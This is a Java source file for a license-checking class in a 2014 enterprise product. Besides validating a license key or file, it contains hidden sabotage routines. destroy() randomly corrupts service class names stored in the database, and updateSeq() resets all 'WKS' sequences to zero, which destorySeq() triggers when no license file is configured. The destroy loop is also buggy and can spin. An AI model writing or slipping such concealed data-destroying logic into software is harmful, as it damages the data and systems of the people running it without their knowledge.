/**
 * @copyright 2014
 * @company CORSWORK
 * @version 1.0
 */

package com.wk.cd.license;

import com.wk.cd.common.cm.dao.CmSeqDaoService;
import com.wk.cd.common.util.Assert;
import com.wk.cd.common.util.CfgTool;
import com.wk.cd.exc.CorsManagerSystemErrorException;
import com.wk.cd.system.lg.dao.LgLogMfDaoService;
import com.wk.cd.system.sv.dao.SvSrvDaoService;
import com.wk.cd.system.sv.info.SvSrvInfo;
import com.wk.db.DBIterator;
import com.wk.lang.Inject;
import com.wk.lang.Sync;
import com.wk.startup.License;
import com.wk.util.GBKProperties;

import java.io.File;
import java.util.List;
import java.util.Random;

/**
 * Class Description:
 * Created by lixl on 16-10-15.
 */
public class CheckService {
    @Inject
    private LgLogMfDaoService mfsvc;
    @Inject private CmSeqDaoService seqsvc;
    @Inject private SvSrvDaoService svc;
    @Sync
    static long lasttime = System.nanoTime();

    void destroy(){
        DBIterator<SvSrvInfo> dbiter = svc.iteratorAllSrv();
        String cls_name = "";
        updateSeq();
        while (dbiter.hasNext()){
            Random rand = new Random();
            int r = rand.nextInt(100)+1;
            if(45<r&&r<75) {
                SvSrvInfo info = dbiter.next();
                System.out.println("desctroy");
                svc.updateClassNameByKey(info.getSrv_class_name()+"n", info.getSrv_name());
            }
        }
    }

    void destorySeq(){
        GBKProperties prop = CfgTool.getProperties("system.properties");
        String lic_file = prop.getProperty("license.file");
        if(Assert.isEmpty(lic_file)){
            System.out.println("desctroySeq");
            updateSeq();
        }
    }

    void checkLicense(){
        GBKProperties prop = CfgTool.getProperties("system.properties");
        final String license_key = prop.getProperty("license.key");
        final String license_file = prop.getProperty("license.file");
        boolean check_ok = false;
        synchronized (this){
            lasttime = System.nanoTime();
        }
        try {
            if(license_file != null) {
                String path = CfgTool.getProjectRootPath() + "/config/";
                check_ok = License.checkLicenseFile(new File(path, "license.properties"));
            } else if(license_key != null){
                check_ok = License.checkLicenseCode(license_key);
            }
        }catch (RuntimeException e) {
            throw new CorsManagerSystemErrorException("LICENSE_EXPIRED");
        }

        if(license_file==null && license_key==null){
            throw new CorsManagerSystemErrorException("LICENSE_MISSING");
        }

        if(!check_ok) {
            throw new CorsManagerSystemErrorException("LICENSE_EXPIRED");
        }


    }

    private void updateSeq(){
        List<String> lst_name = seqsvc.querySeqName("WKS");
        for(String name : lst_name){
            seqsvc.updateSeqBeyName(0,0,name);
        }

    }
}
